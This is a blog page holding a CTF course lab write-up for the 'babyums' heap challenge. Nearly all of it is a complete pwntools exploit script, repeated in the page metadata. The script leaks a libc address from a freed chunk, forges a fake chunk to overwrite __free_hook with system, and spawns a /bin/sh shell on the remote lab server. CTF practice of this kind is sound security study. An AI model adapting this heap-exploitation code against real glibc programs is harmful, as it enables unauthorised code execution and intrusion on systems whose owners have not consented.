<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Simple PWN 0x20(Lab - babyums - flag 2)
  #


  tags: CTF PWN eductf
  #

Version: Ubuntu 20.04

  Original Code
  #

Simple PWN 0x19(Lab - babyums - flag 1)

  Exploit
  #

Very similar in this article: 0x18(Lab - babynote)
:::spoiler code
from pwn import *

# r = process('./chal')
r = remote('edu-ctf.zoolab.org', 10008)

context.arch = 'amd64'

def add_user(idx, user_name, user_passwd):
    r.sendafter(b'> ', b'1')
    r.sendlineafter(b'index\n> ', str(idx))
    r.sendafter(b'username\n> ', user_name)
    r.sendafter(b'password\n> ', user_passwd)

def edit_data(idx, note_size, message):
    r.sendafter(b&#34;> &#34;, b&#34;2&#34;)
    r.sendlineafter(b'index\n> ', str(idx))
    r.sendlineafter(b'size\n> ', str(note_size))
    r.send(message)

def del_user(idx):
    r.sendafter(b&#34;> &#34;, b&#34;3&#34;)
    r.sendlineafter(b'index\n> ', str(idx))

def show_user():
    r.sendafter(b&#34;> &#34;, b&#34;4&#34;)


'''------------------
Construct heap memory
------------------'''
add_user(0, b'a'*8, b'aaaa')
edit_data(0, 0x418, b'a')

add_user(1, b'b'*8, b'bbbb')
edit_data(1, 0x18, b'b')

add_user(2, b'c'*8, b'cccc')

'''------------------
Leak libc address
------------------'''
del_user(0)
show_user()
r.recvuntil(b'data:')
libc = (u64(r.recv(8)) >> 8) - 0x1ecbe0 - 0xa000000000000
info(f&#34;libc address: {hex(libc)}&#34;)
free_hook_addr = libc + 0x1eee48
info(f&#34;__free_hook address: {hex(free_hook_addr)}&#34;)
libc_sys_addr = libc + 0x52290
info(f&#34;__libc_system address: {hex(libc_sys_addr)}&#34;)

'''------------------
Construct fake chunk
------------------'''
data = b'/bin/sh\x00'.ljust(0x10, b'b')
fake_chunk = flat(
    0, 0x31,
    b'cccccccc', b'cccccccc',
    b'cccccccc', b'cccccccc',
    free_hook_addr
)

edit_data(1, 0x48, data + fake_chunk)
edit_data(2, 0x8, p64(libc_sys_addr))
del_user(1)

r.interactive()
:::"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN 0x20(Lab - `babyums` - flag 2)"><meta property="og:description" content="Simple PWN 0x20(Lab - babyums - flag 2) # tags: CTF PWN eductf # Version: Ubuntu 20.04
Original Code # Simple PWN 0x19(Lab - babyums - flag 1)
Exploit # Very similar in this article: 0x18(Lab - babynote) :::spoiler code
from pwn import * # r = process('./chal') r = remote('edu-ctf.zoolab.org', 10008) context.arch = 'amd64' def add_user(idx, user_name, user_passwd): r.sendafter(b'> ', b'1') r.sendlineafter(b'index\n> ', str(idx)) r.sendafter(b'username\n> ', user_name) r.sendafter(b'password\n> ', user_passwd) def edit_data(idx, note_size, message): r.sendafter(b&#34;> &#34;, b&#34;2&#34;) r.sendlineafter(b'index\n> ', str(idx)) r.sendlineafter(b'size\n> ', str(note_size)) r.send(message) def del_user(idx): r.sendafter(b&#34;> &#34;, b&#34;3&#34;) r.sendlineafter(b'index\n> ', str(idx)) def show_user(): r.sendafter(b&#34;> &#34;, b&#34;4&#34;) '''------------------ Construct heap memory ------------------''' add_user(0, b'a'*8, b'aaaa') edit_data(0, 0x418, b'a') add_user(1, b'b'*8, b'bbbb') edit_data(1, 0x18, b'b') add_user(2, b'c'*8, b'cccc') '''------------------ Leak libc address ------------------''' del_user(0) show_user() r.recvuntil(b'data:') libc = (u64(r.recv(8)) >> 8) - 0x1ecbe0 - 0xa000000000000 info(f&#34;libc address: {hex(libc)}&#34;) free_hook_addr = libc + 0x1eee48 info(f&#34;__free_hook address: {hex(free_hook_addr)}&#34;) libc_sys_addr = libc + 0x52290 info(f&#34;__libc_system address: {hex(libc_sys_addr)}&#34;) '''------------------ Construct fake chunk ------------------''' data = b'/bin/sh\x00'.ljust(0x10, b'b') fake_chunk = flat( 0, 0x31, b'cccccccc', b'cccccccc', b'cccccccc', b'cccccccc', free_hook_addr ) edit_data(1, 0x48, data + fake_chunk) edit_data(2, 0x8, p64(libc_sys_addr)) del_user(1) r.interactive() :::"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><meta property="article:tag" content="Eductf"><title>Simple PWN 0x20(Lab - `babyums` - flag 2) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN 0x20(Lab - `babyums` - flag 2)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit>Exploit</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn-0x20lab---babyums---flag-2>Simple PWN 0x20(Lab - <code>babyums</code> - flag 2)
<a class=anchor href=#simple-pwn-0x20lab---babyums---flag-2>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><p>Version: Ubuntu 20.04</p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><p><a href=/2bR8lalySvKfA7Zr8DOhuA>Simple PWN 0x19(Lab - <code>babyums</code> - flag 1)</a></p><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><p>Very similar in this article: <a href=/zj3FTgxZQ22EgRPn1KHUSg>0x18(Lab - <code>babynote</code>)</a>
:::spoiler code</p><pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *

# r = process(&#39;./chal&#39;)
r = remote(&#39;edu-ctf.zoolab.org&#39;, 10008)

context.arch = &#39;amd64&#39;

def add_user(idx, user_name, user_passwd):
    r.sendafter(b&#39;&gt; &#39;, b&#39;1&#39;)
    r.sendlineafter(b&#39;index\n&gt; &#39;, str(idx))
    r.sendafter(b&#39;username\n&gt; &#39;, user_name)
    r.sendafter(b&#39;password\n&gt; &#39;, user_passwd)

def edit_data(idx, note_size, message):
    r.sendafter(b&#34;&gt; &#34;, b&#34;2&#34;)
    r.sendlineafter(b&#39;index\n&gt; &#39;, str(idx))
    r.sendlineafter(b&#39;size\n&gt; &#39;, str(note_size))
    r.send(message)

def del_user(idx):
    r.sendafter(b&#34;&gt; &#34;, b&#34;3&#34;)
    r.sendlineafter(b&#39;index\n&gt; &#39;, str(idx))

def show_user():
    r.sendafter(b&#34;&gt; &#34;, b&#34;4&#34;)


&#39;&#39;&#39;------------------
Construct heap memory
------------------&#39;&#39;&#39;
add_user(0, b&#39;a&#39;*8, b&#39;aaaa&#39;)
edit_data(0, 0x418, b&#39;a&#39;)

add_user(1, b&#39;b&#39;*8, b&#39;bbbb&#39;)
edit_data(1, 0x18, b&#39;b&#39;)

add_user(2, b&#39;c&#39;*8, b&#39;cccc&#39;)

&#39;&#39;&#39;------------------
Leak libc address
------------------&#39;&#39;&#39;
del_user(0)
show_user()
r.recvuntil(b&#39;data:&#39;)
libc = (u64(r.recv(8)) &gt;&gt; 8) - 0x1ecbe0 - 0xa000000000000
info(f&#34;libc address: {hex(libc)}&#34;)
free_hook_addr = libc + 0x1eee48
info(f&#34;__free_hook address: {hex(free_hook_addr)}&#34;)
libc_sys_addr = libc + 0x52290
info(f&#34;__libc_system address: {hex(libc_sys_addr)}&#34;)

&#39;&#39;&#39;------------------
Construct fake chunk
------------------&#39;&#39;&#39;
data = b&#39;/bin/sh\x00&#39;.ljust(0x10, b&#39;b&#39;)
fake_chunk = flat(
    0, 0x31,
    b&#39;cccccccc&#39;, b&#39;cccccccc&#39;,
    b&#39;cccccccc&#39;, b&#39;cccccccc&#39;,
    free_hook_addr
)

edit_data(1, 0x48, data + fake_chunk)
edit_data(2, 0x8, p64(libc_sys_addr))
del_user(1)

r.interactive()
</code></pre><p>:::</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit>Exploit</a></li></ul></nav></div></aside></main></body></html>